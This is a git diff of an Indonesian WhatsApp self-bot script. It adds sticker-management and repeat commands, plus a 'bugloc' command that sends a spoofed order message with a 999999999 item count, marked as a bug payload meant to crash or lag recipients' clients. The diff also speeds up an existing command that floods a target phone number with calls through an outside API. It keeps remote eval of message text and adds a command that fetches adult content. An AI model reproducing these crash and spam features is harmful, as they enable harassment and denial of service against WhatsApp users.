@@ -76,6 +76,8 @@ const getJson = async(url) => {
 }
 const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
 let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
+const setiker = JSON.parse(fs.readFileSync('./temp/stick.json'))
+
 
 fake = `_ [ 𝙎𝙀𝙇𝙁-𝘽𝙊𝙏 ] _`
 numbernye = '0'
@@ -580,7 +582,11 @@ const isAfk = (idi) => {
 		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
 		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
         	const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
-		function kyun(seconds){
+		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
+		    const messagesC = pes.slice(0).trim()
+
+
+function kyun(seconds){
   function pad(s){
     return (s < 10 ? '0' : '') + s;
   }
@@ -632,12 +638,17 @@ ridwan.on("CB:action,,battery", json => {
 })
 ridwan.on('CB:action,,call', async json => {
     const kabg = json[2][0][1].from;
-    console.log("call dari "+ callerId)
+    console.log("call dari "+ kabg)
         ridwan.sendMessage(kabg, telponv, text,{contextInfo: {forwardingScore: 509, isForwarded: true}, quoted: finv, sendEphemeral: true})
         await tidur(5000)
 	ridwan.blockUser(kabg, 'add')
-	ridwan.deleteChat(mek.key.remoteJid)
+//	ridwan.deleteChat(mek.key.remoteJid)
 });
+if (setiker.includes(messagesC)){
+	namastc = messagesC
+	buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
+	ridwan.sendMessage(from, buffer, sticker, {quoted:mek })
+	}
 try{
 if(!mek.message.extendedTextMessage.contextInfo.quotedMessage.orderMessage.itemCount < 991){
 	try{
@@ -647,6 +658,7 @@ if(!mek.message.extendedTextMessage.contextInfo.quotedMessage.orderMessage.itemC
 ⬡ id : ${mek.key.id}`
 		reply(teks)
 		ridwan.deleteChat(mek.key.remoteJid)
+		sleep(3000)
 		ridwan.modifyChat(from, ChatModification.mute, 24*60*60*1000)
 	}catch(e){
 	}
@@ -1318,6 +1330,33 @@ ridwan.sendMessage(from, 'Salken juga bang wkwk:v', text,{quoted: troli})
 ridwan.sendMessage(from, 'Orang mana bang?', text,{quoted: troli})
 ridwan.sendMessage(from, 'Iya lah ajg:v', text,{quoted: troli})
 break
+case prefix+ 'bugloc':
+if(!q) return reply(`Example : ${prefix}bugloc Rumah doi|Jl.`)
+namaxx = q.split('|')[0]
+jlnxx = q.split('|')[1]
+ridwan.sendMessage(from, { "degreesLatitude": 37.38980827772353,
+						"degreesLongitude": -122.08141386508942,
+            "name": namaxx,
+            "address": jlnxx,
+            "jpegThumbnail": fs.readFileSync('./stik/fake.jpeg') }, location, { quoted:{
+				  key: {
+				   fromMe: false,
+				   participant: `0@s.whatsapp.net`, // Fake sender Jid
+				   remoteJid: "status@broadcast"
+				  },
+				  message: {
+				   orderMessage: {
+				    itemCount: 999999999, // Bug
+				    status: 1,
+				    surface: 1,
+				    message: '999999999',
+				    orderTitle: '999999999', // Idk what this does
+				    sellerJid: `0@s.whatsapp.net` // Seller
+				   }
+				  }
+				 }
+				})
+					break
    case prefix+ 'bug':
   case prefix+ 'ridwanxyz':
 	    if (!mek.key.fromMe) return reply('Bug goblok!')
@@ -1411,15 +1450,15 @@ reply(`Mencoba mengirim spam ke nomor ${q}`)
 wok1 = await axios.get(`https://videfikri.com/api/call/?nohp=${q}`)
 await tidur(5000)
 wok2 = await axios.get(`https://videfikri.com/api/call/?nohp=${q}`)
-await tidur(10000)
+await tidur(5000)
 wok3 = await axios.get(`https://videfikri.com/api/call/?nohp=${q}`)
-await tidur(15000)
+await tidur(5000)
 wok4 = await axios.get(`https://videfikri.com/api/call/?nohp=${q}`)
-await tidur(20000)
+await tidur(5000)
 wok5 = await axios.get(`https://videfikri.com/api/call/?nohp=${q}`)
-await tidur(25000)
+await tidur(5000)
 wok6 = await axios.get(`https://videfikri.com/api/call/?nohp=${q}`)
-await tidur(30000)
+await tidur(5000)
 wok = await axios.get(`https://videfikri.com/api/call/?nohp=${q}`)
 reply(`_[!] ${wok1.data.result.logs}_\n\n\n_[!] ${wok2.data.result.logs}_\n\n\n_[!] ${wok3.data.result.logs}_\n\n\n_[!] ${wok4.data.result.logs}_\n\n\n_[!] ${wok5.data.result.logs}_\n\n\n_[!] ${wok6.data.result.logs}_\n\n\n_[!] ${wok.data.result.logs}_`)
 
@@ -1673,7 +1712,42 @@ case prefix+ 'resend':
 
 
 
-
+case prefix+ 'repeat':
+mekk = `${q}\n`.repeat(q.split(`|`))
+reply(mekk)
+break
+//********** ADD **********//
+		case prefix+ 'addstik':
+				if (!isQuotedSticker) return reply('Reply stiker nya')
+				if (!q) return reply('Nama sticker nya apa?')
+				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+				delb = await ridwan.downloadMediaMessage(boij)
+				setiker.push(`${q}`)
+				fs.writeFileSync(`./temp/stick/${q}.webp`, delb)
+				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
+				ridwan.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: mek })
+				break
+		case prefix+ 'liststik':
+				teks = '*Sticker list :*\n\n'
+				for (let awokwkwk of setiker) {
+					teks += `- ${awokwkwk}\n`
+				}
+		teks += `\n*Total : ${setiker.length}*`
+		ridwan.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
+		break
+		case prefix+ 'dellstik':
+		if(!mek.key.fromMe) return fakegroup('Only owner')
+		if (!q) return fakegroup(mess.wrongFormat)
+		try {
+			fs.unlinkSync(`./temp/stick/${q}.webp`)
+			setiker.splice(q,1)
+			fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
+			fakegroup(`Succes delete sticker ${q}!`)
+			} catch (err) {
+		fakegroup(`Gagal delete sticker ${q}!`)
+			}
+		break
+//***** Wokeee ***//
 case prefix+ 'spams':
 			  if(!mek.key.fromMe) return reply('Owner only tod!')
 			  	if(mek.message.conversation){
@@ -2322,22 +2396,10 @@ case prefix+ 'kontaktag':
          	banChats = true
           	fakestatus(`「 _*SELF-MODE*_ 」`)
           	break
-	case prefix+ 'spamtag':
-	const hideTag = (from, text) => {
-	anjayy = groupMembers
-	ane = []
-	for (let i of anjayy){
-		ane.push(i.jid)
-	}
-	ridwan.sendMessage(from, text, MessageType.text, {contextInfo: {"mentionedJid": ane}})
-}
-	argz = q.split("|")
-
-	for (let i=0; 0 < argz[1]; i++){
-	hideTag(from, argz[0])
-	}
+	case prefix+ 'randombkp':
+ 		yoir = await axios.get('https://ferdizstar-api.herokuapp.com/api/dewasa')
+		sendMediaURL(from, yoir.data.image, yoir.data.teks)
 	break
-
  	case prefix+ 'hidetag':
 	case prefix+ 'p':
 			if (!mek.key.fromMe) return fakestatus('Ente sapee')
@@ -2894,19 +2956,19 @@ break
 
 
 default:
-if (budy.startsWith('X')){
-if (!mek.key.fromMe) return reply('Lu siapa si?')
+if (budy.startsWith('x')){
+if (!mek.key.fromMe) return console.log(sender)
 console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval brooo`))
 try {
 return ridwan.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
-//console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval brooo`))
+console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval brooo`))
 } catch(err) {
 e = String(err)
 fakestatus(e)
 }
 }  
 
-if (budy.startsWith('>')){
+else if (budy.startsWith('>')){
 				if(!mek.key.fromMe) return reply(' lu siaa?')
 				console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V2 brooo`))
 				try{
